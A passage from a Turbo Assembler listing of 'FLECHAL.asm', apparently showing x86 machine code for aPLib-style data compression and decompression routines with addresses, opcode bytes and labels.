1  3557	000019EE  8A 16			 mov dl, byte ptr [esi]
1  3558	000019F0  02 D2			 add dl, dl
1  3559	000019F2  FE C2			 inc dl
1  3560	000019F4  49			 dec ecx
1  3561	000019F5  88 16			 mov byte ptr [esi], dl
1  3562	000019F7  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3563	000019FA  74 5E			 je aplib@186
1  3564
1  3565	000019FC			 aplib@187:
1  3566
1  3567	000019FC  8A 16			 mov dl, byte ptr [esi]
1  3568	000019FE  02 D2			 add dl, dl
1  3569	00001A00  FE C2			 inc dl
1  3570	00001A02  49			 dec ecx
1  3571	00001A03  88 16			 mov byte ptr [esi], dl
1  3572	00001A05  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3573	00001A08  75 08			 jne aplib@188
1  3574	00001A0A  B9 00000007		 mov ecx, 00000007
1  3575	00001A0F  8B F3			 mov esi, ebx
1  3576	00001A11  43			 inc ebx
1  3577
1  3578	00001A12			 aplib@188:
1  3579
1  3580	00001A12  8B 7C	24 08		 mov edi, dword	ptr [esp+08]
1  3581	00001A16  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  3582	00001A1A  8A 16			 mov dl, byte ptr [esi]
1  3583	00001A1C  83 EF	02		 sub edi, 00000002
1  3584	00001A1F  02 D2			 add dl, dl
1  3585	00001A21  03 C0			 add eax, eax
1  3586	00001A23  83 E7	01		 and edi, 00000001
1  3587	00001A26  88 16			 mov byte ptr [esi], dl
1  3588	00001A28  03 C7			 add eax, edi
1  3589	00001A2A  88 03			 mov byte ptr [ebx], al
1  3590	00001A2C  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  3591	00001A30  43			 inc ebx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 64
FLECHAL.asm



1  3592	00001A31  A3 000AC1E8r		 mov dword ptr [aplib@016], eax
1  3593
1  3594	00001A36			 aplib@189:
1  3595
1  3596	00001A36  89 35	000AC1DCr	 mov dword ptr [aplib@086], esi
1  3597	00001A3C  89 1D	000AC1D4r	 mov dword ptr [aplib@004], ebx
1  3598	00001A42  89 0D	000AC1E0r	 mov dword ptr [aplib@015], ecx
1  3599	00001A48  83 C4	10		 add esp, 00000010h
1  3600	00001A4B  E9 FFFFFB03		 jmp aplib@129
1  3601
1  3602	00001A50			 aplib@184:
1  3603
1  3604	00001A50  B9 00000007		 mov ecx, 00000007
1  3605	00001A55  8B F3			 mov esi, ebx
1  3606	00001A57  43			 inc ebx
1  3607	00001A58  EB 94			 jmp aplib@185
1  3608
1  3609	00001A5A			 aplib@186:
1  3610
1  3611	00001A5A  B9 00000007		 mov ecx, 00000007
1  3612	00001A5F  8B F3			 mov esi, ebx
1  3613	00001A61  43			 inc ebx
1  3614	00001A62  EB 98			 jmp aplib@187
1  3615
1  3616	00001A64			 aplib@183:
1  3617
1  3618	00001A64  49			 dec ecx
1  3619	00001A65  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3620	00001A68  0F 84	00000087	 je aplib@190
1  3621
1  3622	00001A6E			 aplib@201:
1  3623
1  3624	00001A6E  8A 16			 mov dl, byte ptr [esi]
1  3625	00001A70  02 D2			 add dl, dl
1  3626	00001A72  FE C2			 inc dl
1  3627	00001A74  49			 dec ecx
1  3628	00001A75  88 16			 mov byte ptr [esi], dl
1  3629	00001A77  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3630	00001A7A  0F 84	00000082	 je aplib@191
1  3631
1  3632	00001A80			 aplib@202:
1  3633
1  3634	00001A80  8A 16			 mov dl, byte ptr [esi]
1  3635	00001A82  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  3636	00001A86  02 D2			 add dl, dl
1  3637	00001A88  8B 2D	000AC1E8r	 mov ebp, dword	ptr [aplib@016]
1  3638	00001A8E  88 16			 mov byte ptr [esi], dl
1  3639	00001A90  3B C5			 cmp eax, ebp
1  3640	00001A92  74 7B			 je aplib@192
1  3641	00001A94  8B E8			 mov ebp, eax
1  3642	00001A96  C1 ED	08		 shr ebp, 08
1  3643	00001A99  33 C0			 xor eax, eax
1  3644	00001A9B  83 C5	03		 add ebp, 00000003
1  3645
1  3646	00001A9E			 aplib@193:
1  3647
1  3648	00001A9E  03 FF			 add edi, edi
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 65
FLECHAL.asm



1  3649	00001AA0  40			 inc eax
1  3650	00001AA1  89 7C	24 04		 mov dword ptr [esp+04], edi
1  3651	00001AA5  8B FD			 mov edi, ebp
1  3652	00001AA7  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  3653	00001AAB  83 E7	01		 and edi, 00000001
1  3654	00001AAE  D1 ED			 shr ebp, 1
1  3655	00001AB0  03 FA			 add edi, edx
1  3656	00001AB2  83 FD	01		 cmp ebp, 00000001
1  3657	00001AB5  77 E7			 ja aplib@193
1  3658
1  3659	00001AB7			 aplib@200:
1  3660
1  3661	00001AB7  8B EF			 mov ebp, edi
1  3662	00001AB9  48			 dec eax
1  3663	00001ABA  83 E5	01		 and ebp, 00000001
1  3664	00001ABD  85 C0			 test eax, eax
1  3665	00001ABF  0F 84	000000F6	 je aplib@194
1  3666	00001AC5  49			 dec ecx
1  3667	00001AC6  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3668	00001AC9  0F 84	000000C9	 je aplib@195
1  3669
1  3670	00001ACF			 aplib@196:
1  3671
1  3672	00001ACF  85 ED			 test ebp, ebp
1  3673	00001AD1  0F 84	000000CE	 je aplib@197
1  3674	00001AD7  8A 16			 mov dl, byte ptr [esi]
1  3675	00001AD9  02 D2			 add dl, dl
1  3676	00001ADB  FE C2			 inc dl
1  3677
1  3678	00001ADD			 aplib@217:
1  3679
1  3680	00001ADD  88 16			 mov byte ptr [esi], dl
1  3681	00001ADF  49			 dec ecx
1  3682	00001AE0  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3683	00001AE3  0F 84	000000C5	 je aplib@198
1  3684
1  3685	00001AE9			 aplib@199:
1  3686
1  3687	00001AE9  8A 16			 mov dl, byte ptr [esi]
1  3688	00001AEB  02 D2			 add dl, dl
1  3689	00001AED  FE C2			 inc dl
1  3690	00001AEF  D1 EF			 shr edi, 1
1  3691	00001AF1  88 16			 mov byte ptr [esi], dl
1  3692	00001AF3  EB C2			 jmp aplib@200
1  3693
1  3694	00001AF5			 aplib@190:
1  3695
1  3696	00001AF5  B9 00000007		 mov ecx, 00000007
1  3697	00001AFA  8B F3			 mov esi, ebx
1  3698	00001AFC  43			 inc ebx
1  3699	00001AFD  E9 FFFFFF6C		 jmp aplib@201
1  3700
1  3701	00001B02			 aplib@191:
1  3702
1  3703	00001B02  B9 00000007		 mov ecx, 00000007
1  3704	00001B07  8B F3			 mov esi, ebx
1  3705	00001B09  43			 inc ebx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 66
FLECHAL.asm



1  3706	00001B0A  E9 FFFFFF71		 jmp aplib@202
1  3707
1  3708	00001B0F			 aplib@192:
1  3709
1  3710	00001B0F  49			 dec ecx
1  3711	00001B10  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3712	00001B13  74 6F			 je aplib@203
1  3713
1  3714	00001B15			 aplib@204:
1  3715
1  3716	00001B15  8A 16			 mov dl, byte ptr [esi]
1  3717	00001B17  02 D2			 add dl, dl
1  3718	00001B19  49			 dec ecx
1  3719	00001B1A  88 16			 mov byte ptr [esi], dl
1  3720	00001B1C  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3721	00001B1F  74 6D			 je aplib@205
1  3722
1  3723	00001B21			 aplib@206:
1  3724
1  3725	00001B21  8A 16			 mov dl, byte ptr [esi]
1  3726	00001B23  02 D2			 add dl, dl
1  3727	00001B25  88 16			 mov byte ptr [esi], dl
1  3728
1  3729	00001B27			 aplib@207:
1  3730
1  3731	00001B27  8B 6C	24 08		 mov ebp, dword	ptr [esp+08]
1  3732	00001B2B  33 C0			 xor eax, eax
1  3733
1  3734	00001B2D			 aplib@208:
1  3735
1  3736	00001B2D  8B 14	24		 mov edx, dword	ptr [esp]
1  3737	00001B30  8B FD			 mov edi, ebp
1  3738	00001B32  40			 inc eax
1  3739	00001B33  03 D2			 add edx, edx
1  3740	00001B35  83 E7	01		 and edi, 00000001
1  3741	00001B38  03 D7			 add edx, edi
1  3742	00001B3A  D1 ED			 shr ebp, 1
1  3743	00001B3C  89 14	24		 mov dword ptr [esp], edx
1  3744	00001B3F  83 FD	01		 cmp ebp, 00000001
1  3745	00001B42  77 E9			 ja aplib@208
1  3746
1  3747	00001B44			 aplib@209:
1  3748
1  3749	00001B44  8B 3C	24		 mov edi, dword	ptr [esp]
1  3750	00001B47  48			 dec eax
1  3751	00001B48  83 E7	01		 and edi, 00000001
1  3752	00001B4B  85 C0			 test eax, eax
1  3753	00001B4D  0F 84	00000106	 je aplib@210
1  3754	00001B53  49			 dec ecx
1  3755	00001B54  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3756	00001B57  0F 84	000000D9	 je aplib@211
1  3757
1  3758	00001B5D			 aplib@212:
1  3759
1  3760	00001B5D  85 FF			 test edi, edi
1  3761	00001B5F  0F 84	000000DE	 je aplib@213
1  3762	00001B65  8A 16			 mov dl, byte ptr [esi]
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 67
FLECHAL.asm



1  3763	00001B67  02 D2			 add dl, dl
1  3764	00001B69  FE C2			 inc dl
1  3765
1  3766	00001B6B			 aplib@214:
1  3767
1  3768	00001B6B  88 16			 mov byte ptr [esi], dl
1  3769	00001B6D  49			 dec ecx
1  3770	00001B6E  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3771	00001B71  0F 84	000000D5	 je aplib@215
1  3772
1  3773	00001B77			 aplib@216:
1  3774
1  3775	00001B77  8A 16			 mov dl, byte ptr [esi]
1  3776	00001B79  02 D2			 add dl, dl
1  3777	00001B7B  FE C2			 inc dl
1  3778	00001B7D  88 16			 mov byte ptr [esi], dl
1  3779	00001B7F  D1 2C	24		 shr dword ptr [esp], 1
1  3780	00001B82  EB C0			 jmp aplib@209
1  3781
1  3782	00001B84			 aplib@203:
1  3783
1  3784	00001B84  B9 00000007		 mov ecx, 00000007
1  3785	00001B89  8B F3			 mov esi, ebx
1  3786	00001B8B  43			 inc ebx
1  3787	00001B8C  EB 87			 jmp aplib@204
1  3788
1  3789	00001B8E			 aplib@205:
1  3790
1  3791	00001B8E  B9 00000007		 mov ecx, 00000007
1  3792	00001B93  8B F3			 mov esi, ebx
1  3793	00001B95  43			 inc ebx
1  3794	00001B96  EB 89			 jmp aplib@206
1  3795
1  3796	00001B98			 aplib@195:
1  3797
1  3798	00001B98  B9 00000007		 mov ecx, 00000007
1  3799	00001B9D  8B F3			 mov esi, ebx
1  3800	00001B9F  43			 inc ebx
1  3801	00001BA0  E9 FFFFFF2A		 jmp aplib@196
1  3802
1  3803	00001BA5			 aplib@197:
1  3804
1  3805	00001BA5  8A 16			 mov dl, byte ptr [esi]
1  3806	00001BA7  02 D2			 add dl, dl
1  3807	00001BA9  E9 FFFFFF2F		 jmp aplib@217
1  3808
1  3809	00001BAE			 aplib@198:
1  3810
1  3811	00001BAE  B9 00000007		 mov ecx, 00000007
1  3812	00001BB3  8B F3			 mov esi, ebx
1  3813	00001BB5  43			 inc ebx
1  3814	00001BB6  E9 FFFFFF2E		 jmp aplib@199
1  3815
1  3816	00001BBB			 aplib@194:
1  3817
1  3818	00001BBB  49			 dec ecx
1  3819	00001BBC  83 F9	FF		 cmp ecx, 0FFFFFFFFh
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 68
FLECHAL.asm



1  3820	00001BBF  74 39			 je aplib@218
1  3821
1  3822	00001BC1			 aplib@219:
1  3823
1  3824	00001BC1  85 ED			 test ebp, ebp
1  3825	00001BC3  74 3F			 je aplib@220
1  3826	00001BC5  8A 16			 mov dl, byte ptr [esi]
1  3827	00001BC7  02 D2			 add dl, dl
1  3828	00001BC9  FE C2			 inc dl
1  3829
1  3830	00001BCB			 aplib@221:
1  3831
1  3832	00001BCB  88 16			 mov byte ptr [esi], dl
1  3833	00001BCD  49			 dec ecx
1  3834	00001BCE  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3835	00001BD1  74 37			 je aplib@222
1  3836
1  3837	00001BD3			 aplib@223:
1  3838
1  3839	00001BD3  8A 16			 mov dl, byte ptr [esi]
1  3840	00001BD5  02 D2			 add dl, dl
1  3841	00001BD7  8A 44	24 0C		 mov al, byte ptr [esp+0Ch]
1  3842	00001BDB  88 16			 mov byte ptr [esi], dl
1  3843	00001BDD  88 03			 mov byte ptr [ebx], al
1  3844	00001BDF  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  3845	00001BE3  43			 inc ebx
1  3846	00001BE4  A3 000AC1E8r		 mov dword ptr [aplib@016], eax
1  3847	00001BE9  3D 00000080		 cmp eax, 00000080h
1  3848	00001BEE  73 24			 jnb aplib@224
1  3849	00001BF0  83 6C	24 08 02	 sub dword ptr [esp+08], 00000002
1  3850	00001BF5  E9 FFFFFF2D		 jmp aplib@207
1  3851
1  3852	00001BFA			 aplib@218:
1  3853
1  3854	00001BFA  B9 00000007		 mov ecx, 00000007
1  3855	00001BFF  8B F3			 mov esi, ebx
1  3856	00001C01  43			 inc ebx
1  3857	00001C02  EB BD			 jmp aplib@219
1  3858
1  3859	00001C04			 aplib@220:
1  3860
1  3861	00001C04  8A 16			 mov dl, byte ptr [esi]
1  3862	00001C06  02 D2			 add dl, dl
1  3863	00001C08  EB C1			 jmp aplib@221
1  3864
1  3865	00001C0A			 aplib@222:
1  3866
1  3867	00001C0A  B9 00000007		 mov ecx, 00000007
1  3868	00001C0F  8B F3			 mov esi, ebx
1  3869	00001C11  43			 inc ebx
1  3870	00001C12  EB BF			 jmp aplib@223
1  3871
1  3872	00001C14			 aplib@224:
1  3873
1  3874	00001C14  3D 00000500		 cmp eax, 00000500h
1  3875	00001C19  72 04			 jb aplib@225
1  3876	00001C1B  FF 4C	24 08		 dec dword ptr [esp+08]
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 69
FLECHAL.asm



1  3877
1  3878	00001C1F			 aplib@225:
1  3879
1  3880	00001C1F  81 7C	24 0C 00007D00	 cmp dword ptr [esp+0Ch], 00007D00h
1  3881	00001C27  0F 82	FFFFFEFA	 jb aplib@207
1  3882	00001C2D  FF 4C	24 08		 dec dword ptr [esp+08]
1  3883	00001C31  E9 FFFFFEF1		 jmp aplib@207
1  3884
1  3885	00001C36			 aplib@211:
1  3886
1  3887	00001C36  B9 00000007		 mov ecx, 00000007
1  3888	00001C3B  8B F3			 mov esi, ebx
1  3889	00001C3D  43			 inc ebx
1  3890	00001C3E  E9 FFFFFF1A		 jmp aplib@212
1  3891
1  3892	00001C43			 aplib@213:
1  3893
1  3894	00001C43  8A 16			 mov dl, byte ptr [esi]
1  3895	00001C45  02 D2			 add dl, dl
1  3896	00001C47  E9 FFFFFF1F		 jmp aplib@214
1  3897
1  3898	00001C4C			 aplib@215:
1  3899
1  3900	00001C4C  B9 00000007		 mov ecx, 00000007
1  3901	00001C51  8B F3			 mov esi, ebx
1  3902	00001C53  43			 inc ebx
1  3903	00001C54  E9 FFFFFF1E		 jmp aplib@216
1  3904
1  3905	00001C59			 aplib@210:
1  3906
1  3907	00001C59  49			 dec ecx
1  3908	00001C5A  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3909	00001C5D  74 25			 je aplib@226
1  3910
1  3911	00001C5F			 aplib@227:
1  3912
1  3913	00001C5F  85 FF			 test edi, edi
1  3914	00001C61  74 2B			 je aplib@228
1  3915	00001C63  8A 16			 mov dl, byte ptr [esi]
1  3916	00001C65  02 D2			 add dl, dl
1  3917	00001C67  FE C2			 inc dl
1  3918
1  3919	00001C69			 aplib@229:
1  3920
1  3921	00001C69  88 16			 mov byte ptr [esi], dl
1  3922	00001C6B  49			 dec ecx
1  3923	00001C6C  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3924	00001C6F  75 08			 jne aplib@230
1  3925	00001C71  B9 00000007		 mov ecx, 00000007
1  3926	00001C76  8B F3			 mov esi, ebx
1  3927	00001C78  43			 inc ebx
1  3928
1  3929	00001C79			 aplib@230:
1  3930
1  3931	00001C79  8A 16			 mov dl, byte ptr [esi]
1  3932	00001C7B  02 D2			 add dl, dl
1  3933	00001C7D  88 16			 mov byte ptr [esi], dl
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 70
FLECHAL.asm



1  3934	00001C7F  E9 FFFFFDB2		 jmp aplib@189
1  3935
1  3936	00001C84			 aplib@226:
1  3937
1  3938	00001C84  B9 00000007		 mov ecx, 00000007
1  3939	00001C89  8B F3			 mov esi, ebx
1  3940	00001C8B  43			 inc ebx
1  3941	00001C8C  EB D1			 jmp aplib@227
1  3942
1  3943	00001C8E			 aplib@228:
1  3944
1  3945	00001C8E  8A 16			 mov dl, byte ptr [esi]
1  3946	00001C90  02 D2			 add dl, dl
1  3947	00001C92  EB D5			 jmp aplib@229
1  3948
1  3949	00001C94			 aplib@023:
1  3950
1  3951	00001C94  56			 push esi
1  3952	00001C95  57			 push edi
1  3953	00001C96  55			 push ebp
1  3954	00001C97  83 EC	2C		 sub esp, 0000002Ch
1  3955	00001C9A  8B 3D	000AC1D0r	 mov edi, dword	ptr [aplib@014]
1  3956	00001CA0  89 44	24 04		 mov dword ptr [esp+04], eax
1  3957	00001CA4  89 54	24 20		 mov dword ptr [esp+20h], edx
1  3958	00001CA8  89 5C	24 14		 mov dword ptr [esp+14h], ebx
1  3959	00001CAC  89 4C	24 0C		 mov dword ptr [esp+0Ch], ecx
1  3960	00001CB0  33 D2			 xor edx, edx
1  3961	00001CB2  8B 0D	000AC1C4r	 mov ecx, dword	ptr [aplib@013]
1  3962	00001CB8  89 54	24 24		 mov dword ptr [esp+24h], edx
1  3963	00001CBC  89 54	24 10		 mov dword ptr [esp+10h], edx
1  3964	00001CC0  8B 15	000AC1C4r	 mov edx, dword	ptr [aplib@013]
1  3965	00001CC6  81 C1	00016800	 add ecx, 00016800h
1  3966	00001CCC  4A			 dec edx
1  3967
1  3968	00001CCD			 aplib@231:
1  3969
1  3970	00001CCD  8B 5C	24 20		 mov ebx, dword	ptr [esp+20h]
1  3971	00001CD1  A1 000AC1CCr		 mov eax, dword	ptr [aplib@017]
1  3972	00001CD6  3B C3			 cmp eax, ebx
1  3973	00001CD8  0F 83	00000082	 jnb aplib@232
1  3974	00001CDE  33 DB			 xor ebx, ebx
1  3975	00001CE0  8A 18			 mov bl, byte ptr [eax]
1  3976	00001CE2  8A 40	01		 mov al, byte ptr [eax+01]
1  3977	00001CE5  25 000000FF		 and eax, 000000FFh
1  3978	00001CEA  8B 1C	9D 000AC1ECr	 mov ebx, dword	ptr [4*ebx+aplib@010]
1  3979	00001CF1  C1 E0	02		 shl eax, 02
1  3980	00001CF4  03 D8			 add ebx, eax
1  3981	00001CF6  A1 000AC1C4r		 mov eax, dword	ptr [aplib@013]
1  3982	00001CFB  3B C8			 cmp ecx, eax
1  3983	00001CFD  76 5D			 jbe aplib@233
1  3984	00001CFF  3B C7			 cmp eax, edi
1  3985	00001D01  76 55			 jbe aplib@234
1  3986
1  3987	00001D03			 aplib@235:
1  3988
1  3989	00001D03  2B C7			 sub eax, edi
1  3990
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 71
FLECHAL.asm



1  3991	00001D05			 aplib@236:
1  3992
1  3993	00001D05  8B 35	000AC1C8r	 mov esi, dword	ptr [aplib@009]
1  3994	00001D0B  8B 1B			 mov ebx, dword	ptr [ebx]
1  3995	00001D0D  89 1C	86		 mov dword ptr [esi+4*eax], ebx
1  3996	00001D10  A1 000AC1CCr		 mov eax, dword	ptr [aplib@017]
1  3997	00001D15  33 DB			 xor ebx, ebx
1  3998	00001D17  0F B6	70 01		 movzx esi, byte ptr [eax+01]
1  3999	00001D1B  8A 18			 mov bl, byte ptr [eax]
1  4000	00001D1D  C1 E6	02		 shl esi, 02
1  4001	00001D20  8B 1C	9D 000AC1ECr	 mov ebx, dword	ptr [4*ebx+aplib@010]
1  4002	00001D27  41			 inc ecx
1  4003	00001D28  03 DE			 add ebx, esi
1  4004	00001D2A  8B 35	000AC1C4r	 mov esi, dword	ptr [aplib@013]
1  4005	00001D30  40			 inc eax
1  4006	00001D31  89 33			 mov dword ptr [ebx], esi
1  4007	00001D33  8D 5E	01		 lea ebx, dword	ptr [esi+01]
1  4008	00001D36  A3 000AC1CCr		 mov dword ptr [aplib@017], eax
1  4009	00001D3B  8B C3			 mov eax, ebx
1  4010	00001D3D  42			 inc edx
1  4011	00001D3E  2B C7			 sub eax, edi
1  4012	00001D40  89 1D	000AC1C4r	 mov dword ptr [aplib@013], ebx
1  4013	00001D46  3D 00016800		 cmp eax, 00016800h
1  4014	00001D4B  0F 86	FFFFFF7C	 jbe aplib@231
1  4015	00001D51  8B FA			 mov edi, edx
1  4016	00001D53  E9 FFFFFF75		 jmp aplib@231
1  4017
1  4018	00001D58			 aplib@234:
1  4019
1  4020	00001D58  8B C1			 mov eax, ecx
1  4021	00001D5A  EB A7			 jmp aplib@235
1  4022
1  4023	00001D5C			 aplib@233:
1  4024
1  4025	00001D5C  33 C0			 xor eax, eax
1  4026	00001D5E  EB A5			 jmp aplib@236
1  4027
1  4028	00001D60			 aplib@232:
1  4029
1  4030	00001D60  81 7C	24 0C 00016700	 cmp dword ptr [esp+0Ch], 00016700h
1  4031	00001D68  76 08			 jbe aplib@237
1  4032	00001D6A  C7 44	24 0C 00016700	 mov [esp+0Ch],	00016700h
1  4033
1  4034	00001D72			 aplib@237:
1  4035
1  4036	00001D72  8B 54	24 20		 mov edx, dword	ptr [esp+20h]
1  4037	00001D76  33 C0			 xor eax, eax
1  4038	00001D78  8B 4C	24 20		 mov ecx, dword	ptr [esp+20h]
1  4039	00001D7C  8A 02			 mov al, byte ptr [edx]
1  4040	00001D7E  33 D2			 xor edx, edx
1  4041	00001D80  8A 51	01		 mov dl, byte ptr [ecx+01]
1  4042	00001D83  8B 0C	85 000AC1ECr	 mov ecx, dword	ptr [4*eax+aplib@010]
1  4043	00001D8A  8B 0C	91		 mov ecx, dword	ptr [ecx+4*edx]
1  4044	00001D8D  85 C9			 test ecx, ecx
1  4045	00001D8F  0F 84	00000214	 je aplib@238
1  4046	00001D95  83 7C	24 0C 01	 cmp dword ptr [esp+0Ch], 00000001
1  4047	00001D9A  0F 86	00000209	 jbe aplib@238
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 72
FLECHAL.asm



1  4048	00001DA0  BA 00000800		 mov edx, 00000800h
1  4049	00001DA5  8B 74	24 20		 mov esi, dword	ptr [esp+20h]
1  4050	00001DA9  8B 2D	000AC1E4r	 mov ebp, dword	ptr [aplib@005]
1  4051	00001DAF  8B 1D	000AC1C4r	 mov ebx, dword	ptr [aplib@013]
1  4052	00001DB5  89 54	24 28		 mov dword ptr [esp+28h], edx
1  4053
1  4054	00001DB9			 aplib@246:
1  4055
1  4056	00001DB9  03 E9			 add ebp, ecx
1  4057	00001DBB  3B EE			 cmp ebp, esi
1  4058	00001DBD  72 2F			 jb aplib@241
1  4059	00001DBF  85 C9			 test ecx, ecx
1  4060	00001DC1  74 2B			 je aplib@241
1  4061	00001DC3  8D 81	00016800	 lea eax, dword	ptr [ecx+00016800h]
1  4062	00001DC9  3B C3			 cmp eax, ebx
1  4063	00001DCB  76 1D			 jbe aplib@242
1  4064	00001DCD  3B CF			 cmp ecx, edi
1  4065	00001DCF  76 15			 jbe aplib@243
1  4066
1  4067	00001DD1			 aplib@245:
1  4068
1  4069	00001DD1  2B CF			 sub ecx, edi
1  4070
1  4071	00001DD3			 aplib@244:
1  4072
1  4073	00001DD3  8B C1			 mov eax, ecx
1  4074	00001DD5  8B 0D	000AC1C8r	 mov ecx, dword	ptr [aplib@009]
1  4075	00001DDB  8B 2D	000AC1E4r	 mov ebp, dword	ptr [aplib@005]
1  4076	00001DE1  8B 0C	81		 mov ecx, dword	ptr [ecx+4*eax]
1  4077	00001DE4  EB D3			 jmp aplib@246
1  4078
1  4079	00001DE6			 aplib@243:
1  4080
1  4081	00001DE6  8B C8			 mov ecx, eax
1  4082	00001DE8  EB E7			 jmp aplib@245
1  4083
1  4084	00001DEA			 aplib@242:
1  4085
1  4086	00001DEA  33 C9			 xor ecx, ecx
1  4087	00001DEC  EB E5			 jmp aplib@244
1  4088
1  4089	00001DEE			 aplib@241:
1  4090
1  4091	00001DEE  81 7C	24 14 00016700	 cmp dword ptr [esp+14h], 00016700h
1  4092	00001DF6  77 74			 ja aplib@260
1  4093
1  4094	00001DF8			 aplib@240:
1  4095
1  4096	00001DF8  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  4097	00001DFC  89 44	24 08		 mov dword ptr [esp+08], eax
1  4098
1  4099	00001E00			 aplib@239:
1  4100
1  4101	00001E00  85 C9			 test ecx, ecx
1  4102	00001E02  0F 84	000001A1	 je aplib@238
1  4103	00001E08  8B 44	24 20		 mov eax, dword	ptr [esp+20h]
1  4104	00001E0C  8B 74	24 14		 mov esi, dword	ptr [esp+14h]
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 73
FLECHAL.asm



1  4105	00001E10  2B C5			 sub eax, ebp
1  4106	00001E12  3B C6			 cmp eax, esi
1  4107	00001E14  0F 87	0000018F	 ja aplib@238
1  4108	00001E1A  8B 74	24 24		 mov esi, dword	ptr [esp+24h]
1  4109	00001E1E  8B 54	24 20		 mov edx, dword	ptr [esp+20h]
1  4110	00001E22  03 D6			 add edx, esi
1  4111	00001E24  89 14	24		 mov dword ptr [esp], edx
1  4112	00001E27  8A 14	2E		 mov dl, byte ptr [esi+ebp]
1  4113	00001E2A  8B 34	24		 mov esi, dword	ptr [esp]
1  4114	00001E2D  BB 00000002		 mov ebx, 00000002
1  4115	00001E32  8A 36			 mov dh, byte ptr [esi]
1  4116	00001E34  89 44	24 1C		 mov dword ptr [esp+1Ch], eax
1  4117	00001E38  3A D6			 cmp dl, dh
1  4118	00001E3A  74 0C			 je aplib@247
1  4119	00001E3C  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  4120	00001E42  0F 85	00000129	 jne aplib@248
1  4121
1  4122	00001E48			 aplib@247:
1  4123
1  4124	00001E48  8B 54	24 08		 mov edx, dword	ptr [esp+08]
1  4125	00001E4C  8B 74	24 20		 mov esi, dword	ptr [esp+20h]
1  4126	00001E50  03 D5			 add edx, ebp
1  4127	00001E52  03 F3			 add esi, ebx
1  4128	00001E54  89 54	24 18		 mov dword ptr [esp+18h], edx
1  4129	00001E58  8D 04	2B		 lea eax, dword	ptr [ebx+ebp]
1  4130
1  4131	00001E5B			 aplib@261:
1  4132
1  4133	00001E5B  8A 10			 mov dl, byte ptr [eax]
1  4134	00001E5D  3A 16			 cmp dl, byte ptr [esi]
1  4135	00001E5F  75 15			 jne aplib@259
1  4136	00001E61  3B 44	24 18		 cmp eax, dword	ptr [esp+18h]
1  4137	00001E65  73 0F			 jnb aplib@259
1  4138	00001E67  46			 inc esi
1  4139	00001E68  40			 inc eax
1  4140	00001E69  43			 inc ebx
1  4141	00001E6A  EB EF			 jmp aplib@261
1  4142
1  4143	00001E6C			 aplib@260:
1  4144
1  4145	00001E6C  C7 44	24 14 00016700	 mov [esp+14h],	00016700h
1  4146	00001E74  EB 82			 jmp aplib@240
1  4147
1  4148	00001E76			 aplib@259:
1  4149
1  4150	00001E76  8B 74	24 0C		 mov esi, dword	ptr [esp+0Ch]
1  4151	00001E7A  3B DE			 cmp ebx, esi
1  4152	00001E7C  75 13			 jne aplib@258
1  4153	00001E7E  8B 44	24 1C		 mov eax, dword	ptr [esp+1Ch]
1  4154	00001E82  89 74	24 24		 mov dword ptr [esp+24h], esi
1  4155	00001E86  33 C9			 xor ecx, ecx
1  4156	00001E88  89 44	24 10		 mov dword ptr [esp+10h], eax
1  4157	00001E8C  E9 FFFFFF6F		 jmp aplib@239
1  4158
1  4159	00001E91			 aplib@258:
1  4160
1  4161	00001E91  8B 6C	24 24		 mov ebp, dword	ptr [esp+24h]
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 74
FLECHAL.asm



1  4162	00001E95  89 3D	000AC1D0r	 mov dword ptr [aplib@014], edi
1  4163	00001E9B  3B DD			 cmp ebx, ebp
1  4164	00001E9D  0F 86	00000081	 jbe aplib@257
1  4165	00001EA3  8B 44	24 1C		 mov eax, dword	ptr [esp+1Ch]
1  4166	00001EA7  8B D3			 mov edx, ebx
1  4167	00001EA9  E8 FFFFF87A		 call aplib@025
1  4168	00001EAE  8B F0			 mov esi, eax
1  4169	00001EB0  8B D5			 mov edx, ebp
1  4170	00001EB2  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4171	00001EB6  E8 FFFFF86D		 call aplib@025
1  4172	00001EBB  8B D6			 mov edx, esi
1  4173	00001EBD  2B D0			 sub edx, eax
1  4174	00001EBF  03 D2			 add edx, edx
1  4175	00001EC1  BE 0000000D		 mov esi, 0000000Dh
1  4176	00001EC6  8B C2			 mov eax, edx
1  4177	00001EC8  C1 FA	1F		 sar edx, 1Fh
1  4178	00001ECB  F7 FE			 idiv esi
1  4179	00001ECD  03 C5			 add eax, ebp
1  4180	00001ECF  3B D8			 cmp ebx, eax
1  4181	00001ED1  76 51			 jbe aplib@257
1  4182
1  4183	00001ED3			 aplib@255:
1  4184
1  4185	00001ED3  8B 44	24 1C		 mov eax, dword	ptr [esp+1Ch]
1  4186	00001ED7  89 5C	24 24		 mov dword ptr [esp+24h], ebx
